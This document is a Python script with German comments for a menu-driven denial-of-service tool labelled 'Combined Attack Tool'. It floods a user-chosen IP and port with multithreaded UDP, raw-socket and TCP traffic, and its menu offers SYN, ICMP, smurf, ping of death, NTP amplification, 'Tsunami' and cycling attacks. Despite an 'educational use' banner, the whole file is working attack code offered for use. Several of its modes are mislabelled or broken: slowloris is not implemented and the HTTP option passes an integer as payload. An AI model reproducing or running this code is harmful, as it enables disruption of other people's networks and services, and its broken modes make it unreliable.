import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Farben definieren
COLORS = {
    "menu": "yellow",
    "info": "cyan",
    "success": "green",
    "error": "red"
}

# Banner anzeigen
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, COLORS["error"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("*            Combined Attack Tool         *", COLORS["menu"]))
    print(colored("*         Created for Educational Use     *", COLORS["menu"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("Author: Educational Example", COLORS["success"]))
    print(colored("Usage of this tool must comply with all laws.", COLORS["info"]))
    print(colored("WARNING: Unauthorized use of this tool is illegal.", COLORS["error"]))
    print()

# Angriffsfunktionen
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock_type = socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                data = payload or random._urandom(1024)
                with socket.socket(socket.AF_INET, sock_type) as sock:
                    sock.sendto(data, (ip, port))
                    with lock:
                        stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed. Packets sent: {stats['packets_sent']}", COLORS["success"]))

def tsunami_attack(ip, port, duration, threads):
    lock = Lock()
    stats = {"requests_sent": 0}

    protocol = input(colored("Select protocol (TCP/UDP): ", COLORS["info"])).lower()
    payload = random._urandom(1024)

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        rps = int(input(colored("Enter requests per second (RPS, Max: 10000): ", COLORS["info"])))
        rps = min(rps, 10000)

        while time.time() < timeout:
            try:
                for _ in range(rps):
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM) as sock:
                        sock.connect((ip, port))
                        sock.send(payload)
                        with lock:
                            stats["requests_sent"] += 1
            except Exception:
                continue

    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"Tsunami attack completed. Requests sent: {stats['requests_sent']}", COLORS["success"]))

def cycle_attacks(ip, port, duration, threads, attack_types):
    timeout = time.time() + duration
    while time.time() < timeout:
        for attack_type in attack_types:
            print(colored(f"Switching to {attack_type.upper()} attack.", COLORS["info"]))
            execute_attack(ip, port, 10, threads, attack_type)

# Hilfsfunktionen
def get_target_info():
    ip = input(colored("Enter target IP: ", COLORS["info"]))
    port = int(input(colored("Enter target port (0 if not applicable): ", COLORS["info"])))
    duration = int(input(colored("Enter attack duration (seconds): ", COLORS["info"])))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", COLORS["info"])))
    return min(threads, 100)

# Hauptmenü
def main():
    while True:
        show_banner()
        print(colored("1. UDP Flood", COLORS["menu"]))
        print(colored("2. ICMP Flood", COLORS["menu"]))
        print(colored("3. SYN Flood", COLORS["menu"]))
        print(colored("4. Smurf Attack", COLORS["menu"]))
        print(colored("5. Ping of Death", COLORS["menu"]))
        print(colored("6. Slowloris", COLORS["menu"]))
        print(colored("7. HTTP Flood", COLORS["menu"]))
        print(colored("8. Exit", COLORS["error"]))
        print(colored("9. CharGEN Flood", COLORS["menu"]))
        print(colored("10. NTP Amplification", COLORS["menu"]))
        print(colored("11. Advanced Persistent DoS (APDoS)", COLORS["menu"]))
        print(colored("12. Tsunami Attack (Custom RPS and Protocol)", COLORS["menu"]))
        print(colored("13. Cycle Attacks", COLORS["menu"]))

        choice = input(colored("Select an option: ", COLORS["info"]))

        if choice in ["1", "2", "3", "4", "5", "6", "7", "9", "10", "11", "12", "13"]:
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                execute_attack(ip, 0, duration, threads, "icmp", b"\x08\x00" + random._urandom(32))
            elif choice == "3":
                execute_attack(ip, port, duration, threads, "syn", random._urandom(1024))
            elif choice == "4":
                broadcast_ip = input(colored("Enter broadcast IP: ", COLORS["info"]))
                execute_attack(broadcast_ip, 0, duration, threads, "smurf", b"\x08\x00" + random._urandom(32))
            elif choice == "5":
                execute_attack(ip, 0, duration, threads, "pod", b"\xff" * 65507)
            elif choice == "6":
                execute_attack(ip, port, duration, threads, "slowloris")
            elif choice == "7":
                rps = int(input(colored("Enter requests per second (RPS): ", COLORS["info"])))
                execute_attack(ip, port, duration, threads, "http", rps)
            elif choice == "9":
                execute_attack(ip, port, duration, threads, "chargen", b"CharGEN Test Payload")
            elif choice == "10":
                execute_attack(ip, 123, duration, threads, "ntp", b'\x17\x00\x03\x2a' + b'\x00' * 4)
            elif choice == "11":
                execute_attack(ip, port, duration, threads, "apdos")
            elif choice == "12":
                tsunami_attack(ip, port, duration, threads)
            elif choice == "13":
                attack_types = input(colored("Enter attack types (comma-separated): ", COLORS["info"])).split(",")
                cycle_attacks(ip, port, duration, threads, attack_types)
        elif choice == "8":
            print(colored("Exiting... Goodbye!", COLORS["error"]))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", COLORS["error"]))

if __name__ == "__main__":
    main()
